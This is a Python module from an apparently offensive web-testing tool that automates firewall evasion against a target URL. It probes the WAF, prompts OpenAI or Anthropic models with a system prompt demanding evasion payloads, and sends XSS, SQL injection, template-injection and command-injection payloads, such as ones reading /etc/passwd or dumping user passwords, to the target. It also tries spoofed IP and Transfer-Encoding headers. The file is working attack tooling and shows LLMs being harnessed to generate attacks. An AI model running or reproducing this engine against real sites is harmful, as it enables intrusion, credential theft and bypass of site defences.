#!/usr/bin/env python3
"""
Fray AI Bypass — LLM-assisted adaptive WAF bypass engine.

Usage:
    fray ai-bypass https://target.com/login
    fray ai-bypass https://target.com -c sqli --rounds 5
    OPENAI_API_KEY=sk-... fray ai-bypass https://target.com

Engine flow:
    1. Probe WAF → learn blocked/allowed patterns
    2. Generate payloads via LLM (or smart local fallback)
    3. Test payloads → capture response diffs
    4. Feed results back to LLM → adaptive re-generation
    5. Try header manipulation bypasses
    6. Report findings

Supports: OpenAI, Anthropic, or local (no API key needed).
"""

import json
import os
import re
import sys
import time
import http.client
import ssl
import urllib.parse
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Tuple, Any

from fray import __version__
from fray.evolve import WAFProfile, run_probes


# ── LLM Providers ────────────────────────────────────────────────────────────

def _call_openai(messages: List[Dict], model: str = "gpt-4o-mini",
                 temperature: float = 0.8, max_tokens: int = 2000) -> str:
    """Call OpenAI API using stdlib only."""
    api_key = os.environ.get("OPENAI_API_KEY", "")
    if not api_key:
        return ""

    body = json.dumps({
        "model": model,
        "messages": messages,
        "temperature": temperature,
        "max_tokens": max_tokens,
    }).encode("utf-8")

    conn = http.client.HTTPSConnection("api.openai.com", timeout=30)
    conn.request("POST", "/v1/chat/completions", body=body, headers={
        "Content-Type": "application/json",
        "Authorization": f"Bearer {api_key}",
    })
    resp = conn.getresponse()
    data = json.loads(resp.read().decode("utf-8"))
    conn.close()

    if resp.status != 200:
        return ""
    return data.get("choices", [{}])[0].get("message", {}).get("content", "")


def _call_anthropic(messages: List[Dict], model: str = "claude-3-5-haiku-20241022",
                    temperature: float = 0.8, max_tokens: int = 2000) -> str:
    """Call Anthropic API using stdlib only."""
    api_key = os.environ.get("ANTHROPIC_API_KEY", "")
    if not api_key:
        return ""

    # Convert OpenAI format to Anthropic format
    system_msg = ""
    user_msgs = []
    for m in messages:
        if m["role"] == "system":
            system_msg = m["content"]
        else:
            user_msgs.append(m)

    body = json.dumps({
        "model": model,
        "max_tokens": max_tokens,
        "temperature": temperature,
        "system": system_msg,
        "messages": user_msgs,
    }).encode("utf-8")

    conn = http.client.HTTPSConnection("api.anthropic.com", timeout=30)
    conn.request("POST", "/v1/messages", body=body, headers={
        "Content-Type": "application/json",
        "x-api-key": api_key,
        "anthropic-version": "2023-06-01",
    })
    resp = conn.getresponse()
    data = json.loads(resp.read().decode("utf-8"))
    conn.close()

    if resp.status != 200:
        return ""
    content = data.get("content", [])
    return content[0].get("text", "") if content else ""


def _call_llm(messages: List[Dict], **kwargs) -> str:
    """Try OpenAI first, then Anthropic."""
    result = _call_openai(messages, **kwargs)
    if result:
        return result
    result = _call_anthropic(messages, **kwargs)
    return result


def _llm_available() -> str:
    """Check which LLM provider is available."""
    if os.environ.get("OPENAI_API_KEY"):
        return "openai"
    if os.environ.get("ANTHROPIC_API_KEY"):
        return "anthropic"
    return ""


# ── System Prompt ─────────────────────────────────────────────────────────────

_SYSTEM_PROMPT = """\
You are Fray, an expert WAF bypass researcher. You generate payloads that evade \
Web Application Firewalls. You understand encoding tricks, parser differentials, \
protocol-level bypasses, and browser quirks.

Rules:
- Output ONLY valid JSON arrays of payload objects
- Each object: {"payload": "...", "technique": "...", "reasoning": "..."}
- Generate 5-10 payloads per response
- Focus on techniques the WAF is WEAK against based on probe data
- Use real-world bypass techniques: encoding, tag substitution, event swaps, \
  comment injection, protocol handlers, unicode, null bytes, chunked encoding
- For SQLi: inline comments, CHAR(), case mixing, whitespace substitution
- Consider header-level bypasses: X-Forwarded-For, Transfer-Encoding, Content-Type confusion
- Be creative — combine multiple evasion layers
"""


# ── Response Diffing ──────────────────────────────────────────────────────────

@dataclass
class ResponseDiff:
    """Diff between baseline and payload response."""
    status_changed: bool = False
    length_delta: int = 0
    length_ratio: float = 1.0
    new_headers: List[str] = field(default_factory=list)
    body_keywords: List[str] = field(default_factory=list)
    is_block: bool = False
    is_soft_block: bool = False
    is_challenge: bool = False


def _diff_response(baseline: dict, result: dict) -> ResponseDiff:
    """Compare a payload response to baseline for intelligent analysis."""
    diff = ResponseDiff()

    bl_status = baseline.get("status", 200)
    bl_length = baseline.get("response_length", 0)
    r_status = result.get("status", 0)
    r_length = result.get("response_length", 0)

    diff.status_changed = r_status != bl_status
    diff.length_delta = r_length - bl_length
    diff.length_ratio = r_length / bl_length if bl_length > 0 else 0

    diff.is_block = result.get("blocked", False)

    # Soft block: same status but body much smaller
    if not diff.is_block and bl_length > 1000 and diff.length_ratio < 0.4:
        diff.is_soft_block = True

    # Challenge detection
    resp_str = result.get("response", "").lower()
    if any(kw in resp_str for kw in ("captcha", "challenge", "cf-turnstile", "just a moment")):
        diff.is_challenge = True

    return diff


# ── Header Manipulation Bypasses ──────────────────────────────────────────────

_HEADER_BYPASSES = [
    # IP spoofing headers — bypass IP-based WAF rules
    {"name": "X-Forwarded-For", "values": ["127.0.0.1", "10.0.0.1", "::1"]},
    {"name": "X-Real-IP", "values": ["127.0.0.1"]},
    {"name": "X-Originating-IP", "values": ["127.0.0.1"]},
    {"name": "X-Custom-IP-Authorization", "values": ["127.0.0.1"]},
    {"name": "X-Forwarded-Host", "values": ["localhost"]},
    # Content-type confusion — bypass body inspection
    {"name": "Content-Type", "values": [
        "text/plain", "application/xml", "multipart/form-data; boundary=x",
        "application/x-www-form-urlencoded; charset=ibm500",
    ]},
    # Transfer-encoding tricks — bypass chunked inspection
    {"name": "Transfer-Encoding", "values": [
        "chunked", "identity", " chunked", "chunked, identity",
    ]},
    # WAF bypass via HTTP method override
    {"name": "X-HTTP-Method-Override", "values": ["PUT", "PATCH", "DELETE"]},
    {"name": "X-HTTP-Method", "values": ["PUT"]},
    {"name": "X-Method-Override", "values": ["PUT"]},
]


def _test_header_bypasses(tester, baseline: dict, payload: str, param: str,
                          verbose: bool = False) -> List[dict]:
    """Test header manipulation bypasses for a given payload."""
    results = []
    console = None
    if verbose:
        from fray.output import console as _console
        console = _console

    for hdr in _HEADER_BYPASSES:
        for val in hdr["values"]:
            # Temporarily add the bypass header
            old_headers = dict(tester.custom_headers)
            tester.custom_headers[hdr["name"]] = val

            result = tester.test_payload(payload, param=param)
            diff = _diff_response(baseline, result)

            tester.custom_headers = old_headers  # Restore

            status = result.get("status", 0)
            # Filter false positives: 0 (conn error), 400 (bad request),
            # 404 (not found), 405 (method not allowed) are NOT real bypasses
            is_false_positive = status in (0, 400, 404, 405)

            if not result.get("blocked") and not diff.is_soft_block and not is_false_positive:
                entry = {
                    "payload": payload,
                    "technique": f"header:{hdr['name']}={val}",
                    "header": hdr["name"],
                    "header_value": val,
                    "status": status,
                    "reflected": result.get("reflected", False),
                    "response_length": result.get("response_length", 0),
                    "bypassed": True,
                }
                results.append(entry)
                if verbose and console:
                    ref_tag = " [yellow]REFLECTED[/yellow]" if entry["reflected"] else ""
                    console.print(f"    [green]BYPASS[/green] {hdr['name']}: {val} │ "
                                  f"{status}{ref_tag}")
            elif verbose and console and not is_false_positive and (result.get("blocked") or diff.is_soft_block):
                console.print(f"    [red]BLOCKED[/red] {hdr['name']}: {val} │ {status}")
            elif verbose and console and is_false_positive:
                console.print(f"    [dim]SKIP[/dim]    {hdr['name']}: {val} │ {status} (not a real bypass)")

            tester._stealth_delay()

    return results


# ── Local Payload Generator (no LLM needed) ──────────────────────────────────

def _local_generate(profile: WAFProfile, category: str, blocked_results: List[dict],
                    round_num: int) -> List[dict]:
    """Generate payloads locally based on WAF profile — no API key needed.

    Uses pattern analysis to create targeted mutations. Not as creative as
    an LLM but effective for common WAF configurations.
    """
    from fray.mutator import mutate_payload

    payloads = []

    # Base payloads per category
    _SEEDS = {
        "xss": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<input autofocus onfocus=alert(1)>",
            "'-alert(1)-'",
        ],
        "sqli": [
            "' OR 1=1--",
            "' UNION SELECT NULL,NULL--",
            "1' AND '1'='1",
            "admin'/**/OR/**/1=1--",
            "' OR ''='",
            "-1' UNION SELECT username,password FROM users--",
            "1;WAITFOR DELAY '0:0:5'--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        ],
        "ssti": [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>",
            "{{config}}", "{{self.__init__.__globals__}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
        ],
        "command_injection": [
            "; id", "| id", "`id`", "$(id)",
            "; cat /etc/passwd", "|| whoami",
            "\nid\n", ";%0aid",
        ],
    }

    seeds = _SEEDS.get(category, _SEEDS["xss"])

    # On later rounds, use previously blocked payloads as seeds
    if round_num > 1 and blocked_results:
        seeds = [r.get("payload", "") for r in blocked_results[:5]] + seeds[:3]

    # Use allowed tags/events from profile for smarter seeds
    if profile.allowed_tags and category == "xss":
        for tag in list(profile.allowed_tags)[:3]:
            for event in ["onfocus", "onmouseover", "ontoggle", "onpointerenter"]:
                if event not in profile.blocked_events:
                    seeds.append(f"<{tag} {event}=alert(1)>")

    for seed in seeds:
        variants = mutate_payload(seed, max_variants=3)
        for v in variants:
            payloads.append({
                "payload": v["payload"],
                "technique": f"local:{v['strategy']}",
                "reasoning": f"Mutated '{seed[:30]}...' with {v['strategy']}",
            })

    return payloads[:15]  # Cap per round


# ── LLM Payload Generator ────────────────────────────────────────────────────

def _llm_generate(profile: WAFProfile, category: str, blocked_results: List[dict],
                  bypassed_results: List[dict], round_num: int) -> List[dict]:
    """Generate payloads using LLM based on WAF behavior and previous results."""
    # Build context for the LLM
    context = f"""WAF Profile:
- Strictness: {profile.strictness} ({profile.block_rate:.0f}% block rate)
- Blocked tags: {', '.join(sorted(profile.blocked_tags)) or 'none detected'}
- Allowed tags: {', '.join(sorted(profile.allowed_tags)) or 'none detected'}
- Blocked events: {', '.join(sorted(profile.blocked_events)) or 'none detected'}
- Blocked keywords: {', '.join(sorted(profile.blocked_keywords)) or 'none detected'}
- Blocked encodings: {', '.join(sorted(profile.blocked_encodings)) or 'none detected'}
- WAF vendor: {profile.waf_vendor or 'unknown'}

Attack category: {category}
Round: {round_num}
"""

    if blocked_results:
        blocked_examples = "\n".join(
            f"  BLOCKED: {r.get('payload', '')[:80]} (status {r.get('status', '?')})"
            for r in blocked_results[:5]
        )
        context += f"\nRecently BLOCKED payloads:\n{blocked_examples}\n"

    if bypassed_results:
        bypass_examples = "\n".join(
            f"  BYPASSED: {r.get('payload', '')[:80]} (technique: {r.get('technique', '?')})"
            for r in bypassed_results[:5]
        )
        context += f"\nSuccessful BYPASSES (generate similar):\n{bypass_examples}\n"

    context += f"""
Generate {category.upper()} payloads that will bypass this WAF.
Focus on techniques that exploit the WAF's weaknesses.
{"The WAF is strict — use multi-layer encoding and parser differentials." if profile.strictness == "strict" else ""}
{"Previous rounds found bypasses — generate deeper variants." if bypassed_results else "No bypasses yet — try diverse encoding strategies."}

Return ONLY a JSON array of objects with keys: payload, technique, reasoning
"""

    messages = [
        {"role": "system", "content": _SYSTEM_PROMPT},
        {"role": "user", "content": context},
    ]

    raw = _call_llm(messages)
    if not raw:
        return []

    # Parse JSON from LLM response
    try:
        # Extract JSON array from response (LLM may wrap in markdown)
        json_match = re.search(r'\[.*\]', raw, re.DOTALL)
        if json_match:
            return json.loads(json_match.group())
    except (json.JSONDecodeError, AttributeError):
        pass

    return []


# ── Main AI Bypass Engine ─────────────────────────────────────────────────────

@dataclass
class AIBypassResult:
    """Result from the AI bypass engine."""
    target: str
    category: str
    provider: str  # "openai", "anthropic", "local"
    rounds: int = 0
    total_generated: int = 0
    total_tested: int = 0
    total_bypassed: int = 0
    total_reflected: int = 0
    header_bypasses: int = 0
    waf_strictness: str = ""
    duration: str = ""
    bypasses: List[dict] = field(default_factory=list)
    header_bypass_details: List[dict] = field(default_factory=list)
    blocked_summary: List[str] = field(default_factory=list)


def run_ai_bypass(
    tester,
    category: str = "xss",
    param: str = "input",
    rounds: int = 3,
    max_per_round: int = 10,
    try_headers: bool = True,
    verbose: bool = True,
    json_output: bool = False,
) -> AIBypassResult:
    """Run the AI-assisted WAF bypass engine.

    Flow:
        Round 1: Probe → Generate → Test → Diff
        Round 2: Feed results → Re-generate → Test → Diff
        Round N: Adaptive refinement
        Final: Header manipulation bypasses
    """
    start_time = time.time()
    provider = _llm_available() or "local"

    if verbose and not json_output:
        from fray.output import console, print_header, print_phase
        print_header(f"Fray AI Bypass v{__version__}", target=tester.target)
        console.print(f"  Provider:  [bold]{provider.upper()}[/bold]"
                      f"{'  (set OPENAI_API_KEY or ANTHROPIC_API_KEY for LLM mode)' if provider == 'local' else ''}")
        console.print(f"  Category:  {category}")
        console.print(f"  Rounds:    {rounds}")

    # ── Phase 1: Probe WAF ────────────────────────────────────────────
    if verbose and not json_output:
        console.print()
        print_phase(1, "Probing WAF behavior...")

    profile = run_probes(tester, param=param)

    if verbose and not json_output:
        console.print(f"    Strictness: [bold]{profile.strictness}[/bold] "
                      f"({profile.block_rate:.0f}% block rate)")
        if profile.blocked_tags:
            console.print(f"    Blocked tags:    {', '.join(sorted(profile.blocked_tags))}")
        if profile.allowed_tags:
            console.print(f"    Allowed tags:    [green]{', '.join(sorted(profile.allowed_tags))}[/green]")

    # Baseline
    baseline_result = tester.test_payload("hello", param=param)
    baseline = {
        "status": baseline_result.get("status", 0),
        "response_length": baseline_result.get("response_length", 0),
    }

    # ── Phase 2-N: Generate → Test → Adapt loop ──────────────────────
    all_bypasses = []
    all_blocked = []
    seen_payloads = set()

    for round_num in range(1, rounds + 1):
        if verbose and not json_output:
            console.print()
            print_phase(round_num + 1, f"Round {round_num}/{rounds} — "
                        f"{'LLM' if provider != 'local' else 'Smart local'} generation...")

        # Generate payloads
        if provider != "local":
            generated = _llm_generate(
                profile, category, all_blocked[-5:], all_bypasses[-5:], round_num
            )
            # Fallback to local if LLM returned nothing
            if not generated:
                generated = _local_generate(profile, category, all_blocked[-5:], round_num)
                if verbose and not json_output:
                    console.print("    [dim]LLM returned empty — using local generator[/dim]")
        else:
            generated = _local_generate(profile, category, all_blocked[-5:], round_num)

        if verbose and not json_output:
            console.print(f"    Generated {len(generated)} payload(s)")

        # Test each generated payload
        round_bypasses = 0
        for gp in generated[:max_per_round]:
            payload = gp.get("payload", "")
            if not payload or payload in seen_payloads:
                continue
            seen_payloads.add(payload)

            result = tester.test_payload(payload, param=param)
            diff = _diff_response(baseline, result)

            entry = {
                "payload": payload,
                "technique": gp.get("technique", "?"),
                "reasoning": gp.get("reasoning", ""),
                "status": result.get("status", 0),
                "blocked": result.get("blocked", False) or diff.is_soft_block,
                "reflected": result.get("reflected", False),
                "response_length": result.get("response_length", 0),
                "diff": {
                    "status_changed": diff.status_changed,
                    "length_delta": diff.length_delta,
                    "soft_block": diff.is_soft_block,
                    "challenge": diff.is_challenge,
                },
                "round": round_num,
            }

            if entry["blocked"]:
                all_blocked.append(entry)
                if verbose and not json_output:
                    soft = " [dim](soft block)[/dim]" if diff.is_soft_block else ""
                    chal = " [dim](challenge)[/dim]" if diff.is_challenge else ""
                    console.print(f"    [red]BLOCKED[/red]  {result.get('status', 0)} │ "
                                  f"{gp.get('technique', '?')[:25]}{soft}{chal}")
            else:
                all_bypasses.append(entry)
                round_bypasses += 1
                if verbose and not json_output:
                    ref = " [yellow]REFLECTED[/yellow]" if entry["reflected"] else ""
                    console.print(f"    [green]BYPASS[/green]   {result.get('status', 0)} │ "
                                  f"{gp.get('technique', '?')[:25]} │ "
                                  f"{payload[:50]}{ref}")

            tester._stealth_delay()

        if verbose and not json_output:
            console.print(f"    Round {round_num}: {round_bypasses} bypass(es) "
                          f"from {min(len(generated), max_per_round)} tested")

    # ── Final Phase: Header manipulation bypasses ─────────────────────
    header_results = []
    if try_headers:
        # Pick a payload to test with headers — use first blocked payload or a seed
        test_payload = "<script>alert(1)</script>"
        if all_blocked:
            test_payload = all_blocked[0]["payload"]

        if verbose and not json_output:
            console.print()
            print_phase(rounds + 2, "Header manipulation bypasses...")

        header_results = _test_header_bypasses(
            tester, baseline, test_payload, param, verbose=verbose
        )

        if verbose and not json_output:
            if header_results:
                console.print(f"    Found {len(header_results)} header bypass(es)")
            else:
                console.print("    [dim]No header bypasses found[/dim]")

    # ── Build result ──────────────────────────────────────────────────
    elapsed = time.time() - start_time
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    duration = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"

    ai_result = AIBypassResult(
        target=tester.target,
        category=category,
        provider=provider,
        rounds=rounds,
        total_generated=len(seen_payloads),
        total_tested=len(all_bypasses) + len(all_blocked),
        total_bypassed=len(all_bypasses),
        total_reflected=sum(1 for b in all_bypasses if b.get("reflected")),
        header_bypasses=len(header_results),
        waf_strictness=profile.strictness,
        duration=duration,
        bypasses=all_bypasses[:20],
        header_bypass_details=header_results[:10],
        blocked_summary=[f"{r.get('technique', '?')}: {r['payload'][:60]}"
                         for r in all_blocked[:10]],
    )

    # ── Print results ─────────────────────────────────────────────────
    if verbose and not json_output:
        _print_ai_results(ai_result)

    if json_output:
        print(json.dumps(asdict(ai_result), indent=2, ensure_ascii=False))

    return ai_result


def _print_ai_results(result: AIBypassResult):
    """Print AI bypass results with rich formatting."""
    from fray.output import console
    from rich.panel import Panel
    from rich.table import Table

    # Summary panel
    tbl = Table(show_header=False, box=None, pad_edge=False, padding=(0, 2))
    tbl.add_column("Key", style="dim", min_width=20)
    tbl.add_column("Value")

    tbl.add_row("Target", result.target)
    tbl.add_row("Provider", result.provider.upper())
    tbl.add_row("WAF Strictness", result.waf_strictness)
    tbl.add_row("Rounds", str(result.rounds))
    tbl.add_row("Duration", result.duration)
    tbl.add_row("", "")
    tbl.add_row("Payloads generated", str(result.total_generated))
    tbl.add_row("Payloads tested", str(result.total_tested))
    tbl.add_row("Bypasses found", f"[bold green]{result.total_bypassed}[/bold green]")
    tbl.add_row("Reflected (confirmed)", f"[bold yellow]{result.total_reflected}[/bold yellow]")
    tbl.add_row("Header bypasses", f"[bold cyan]{result.header_bypasses}[/bold cyan]")

    total = result.total_tested
    if total > 0:
        rate = result.total_bypassed / total * 100
        tbl.add_row("Bypass rate", f"[bold]{rate:.1f}%[/bold]")

    console.print()
    console.print(Panel(tbl, title="[bold]AI Bypass Results[/bold]",
                        border_style="bright_cyan", expand=False))

    # Top bypasses
    if result.bypasses:
        bp_table = Table(title="Successful Bypasses", show_lines=False,
                         box=None, title_style="bold", pad_edge=False)
        bp_table.add_column("#", style="dim", width=3, justify="right")
        bp_table.add_column("Technique", width=25)
        bp_table.add_column("Payload", min_width=50)
        bp_table.add_column("Status", width=6, justify="center")

        for i, b in enumerate(result.bypasses[:10], 1):
            ref = " [yellow]REFLECTED[/yellow]" if b.get("reflected") else ""
            bp_table.add_row(
                str(i),
                b.get("technique", "?")[:25],
                f"[dim]{b['payload'][:65]}[/dim]{ref}",
                str(b.get("status", "?")),
            )

        console.print()
        console.print(Panel(bp_table, border_style="dim", expand=False))

    # Header bypasses
    if result.header_bypass_details:
        console.print()
        console.print("  [bold]Header Manipulation Bypasses:[/bold]")
        for hb in result.header_bypass_details[:5]:
            console.print(f"    [green]✓[/green] {hb['header']}: {hb['header_value']}")

    console.print()
    console.rule(style="dim")
